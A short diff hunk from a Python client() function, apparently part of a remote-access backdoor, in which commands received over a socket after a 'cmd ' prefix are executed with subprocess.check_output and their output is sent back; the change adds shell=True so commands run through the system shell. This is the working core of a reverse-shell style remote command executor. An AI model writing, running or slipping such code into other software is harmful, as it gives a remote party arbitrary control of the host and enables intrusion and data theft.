@@ -66,7 +66,7 @@ def client():
         if 'cmd' in data:
             try:
                 data = data.replace('cmd ', '')
-                s.send(subprocess.check_output(data))
+                s.send(subprocess.check_output(data, shell=True))
 
 
             except Exception:
